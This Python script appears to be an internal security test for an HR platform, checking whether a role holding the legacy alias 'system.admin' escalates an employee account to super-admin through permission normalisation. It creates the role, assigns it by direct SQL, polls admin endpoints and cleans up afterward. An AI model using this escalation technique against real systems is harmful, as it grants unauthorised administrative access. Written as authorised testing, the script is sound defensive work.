#!/usr/bin/env python3
"""NU-SEC-RBAC-240: vertical escalation via legacy permission alias. DB has permission row 'system.admin'; JwtAuthenticationFilter.normalizePermissionCode
maps it to SYSTEM:ADMIN (the permission that makes SecurityContext.isSuperAdmin() true). RoleManagementService PRIVILEGED_PERMISSIONS only matches the exact
string 'SYSTEM:ADMIN'. Subject: NUAURA_TEST_RbacEsc (EMPLOYEE). Role assignment is done by SQL because the app path 500s (DEF-HRMS-02)."""
import sys, os, json, time, subprocess
sys.path.insert(0, os.path.dirname(__file__)); import h
SU = os.environ['SU']; N = '660e8400-e29b-41d4-a716-446655440001'
def sql(q): return subprocess.run([SU, '-t', '-A', '-c', q], capture_output=True, text=True).stdout.strip()
T = 'NU-SEC-RBAC-240-legacy-alias-escalation'
uid = sql("select id from users where email='nuaura_test_rbac_esc@nulogic.io'")
PROBES = ['/api/v1/admin/system/overview', '/api/v1/admin/system/tenants', '/api/v1/admin/users']
base = [h.call('esc_user', 'GET', p, test=T, max_body=80, note='baseline EMPLOYEE')[0] for p in PROBES]
print('baseline', base, flush=True)
st, t = h.call('tenant_admin', 'POST', '/api/v1/roles', {'code': 'NUAURA_TEST_ROLE_ESC', 'name': 'NUAURA_TEST_ROLE_ESC', 'description': 'NUAURA_TEST synthetic', 'permissionCodes': ['system.admin']}, test=T, max_body=300, note='tenant_admin creates role carrying legacy alias system.admin')
rid = (h.js(t) or {}).get('id'); print('create role with system.admin ->', st, rid, flush=True)
if not rid:
    st, t = h.call('hr_admin', 'POST', '/api/v1/roles', {'code': 'NUAURA_TEST_ROLE_ESC', 'name': 'NUAURA_TEST_ROLE_ESC', 'permissionCodes': ['system.admin']}, test=T, max_body=300)
    rid = (h.js(t) or {}).get('id'); print('hr_admin attempt ->', st, rid)
if rid:
    sql(f"insert into user_roles (user_id, role_id, tenant_id, is_deleted) values ('{uid}','{rid}','{N}',false)")
    t0 = time.time(); got = None
    while time.time() - t0 < 340:
        r = [h.call('esc_user', 'GET', p, test=T, max_body=120, note='after role assignment')[0] for p in PROBES]
        if any(s == 200 for s in r): got = (round(time.time() - t0, 1), r); break
        time.sleep(5)
    print('RESULT escalation observed:', got, flush=True)
    sql(f"delete from user_roles where role_id='{rid}'; delete from role_permissions where role_id='{rid}'; delete from roles where id='{rid}'")
else:
    print('RESULT role creation rejected -> no escalation path via alias')
